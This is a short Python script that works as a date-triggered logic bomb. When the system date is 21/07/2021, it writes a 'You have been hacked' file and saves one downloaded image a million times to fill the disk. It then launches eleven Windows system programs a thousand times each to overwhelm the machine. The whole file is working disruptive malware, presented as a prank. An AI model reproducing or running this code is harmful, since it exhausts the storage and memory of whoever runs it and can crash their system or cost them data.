import datetime as dt
import requests
import subprocess

# ------------------------------------ TODAY'S DATE --------------------------------------- #
today = dt.date.today().strftime("%d/%m/%Y")
# print(today)


def download_pictures():
    image_url = "https://cdn.pixabay.com/photo/2015/06/18/01/46/hack-813290_960_720.jpg"

    response = requests.get(image_url)

    Repeat_count = 0
    serial_num = 0
    while Repeat_count < 1000000:
        serial_num += 1
        with open(f"you_have_been_hacked_{serial_num}.png", 'wb') as f:
            f.write(response.content)
        Repeat_count += 1


# downloading_pictures()


def open_applications():
    Repeat_count = 0

    while Repeat_count < 1000:
        subprocess.Popen('C:\\Windows\\System32\\write.exe')
        subprocess.Popen('C:\\Windows\\System32\\notepad.exe')
        subprocess.Popen('C:\\Windows\\System32\\calc.exe')
        subprocess.Popen('C:\\Windows\\System32\\mspaint.exe')
        subprocess.Popen('C:\\Windows\\System32\\wiaacmgr.exe')
        subprocess.Popen('C:\\Windows\\System32\\SnippingTool.exe')
        subprocess.Popen('C:\\Windows\\System32\\Utilman.exe')
        subprocess.Popen('C:\\Windows\\System32\\LaunchTM.exe')
        subprocess.Popen('C:\\Windows\\System32\\Utilman.exe')
        subprocess.Popen('C:\\Windows\\System32\\MRT.exe')
        subprocess.Popen('C:\\Windows\\System32\\conhost.exe')

        Repeat_count += 1


# open_applications()

if today == "21/07/2021":
    with open('You_have_been_hacked.txt', 'w') as file:
        file.write("Gotcha! You have been hacked...")
    download_pictures()
    open_applications()
    print(f"It is {today}! You have been hacked!😈")
